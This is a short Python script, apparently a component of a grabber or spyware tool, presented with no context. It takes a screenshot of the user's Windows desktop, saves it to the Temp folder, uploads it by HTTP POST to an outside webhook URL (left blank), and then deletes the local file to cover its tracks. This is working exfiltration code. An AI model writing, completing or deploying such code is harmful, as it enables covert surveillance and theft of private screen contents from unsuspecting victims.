import os.path, requests, os
from PIL import ImageGrab

user = os.path.expanduser("~")

hook = ""

captura = ImageGrab.grab()
captura.save(user+"\\AppData\\Local\\Temp\\ss.png")

file = {"file": open(user+"\\AppData\\Local\\Temp\\ss.png", "rb")}
r = requests.post(hook, files=file)
try:
 os.remove(user+"\\AppData\\Local\\Temp\\ss.png")
except:
    pass
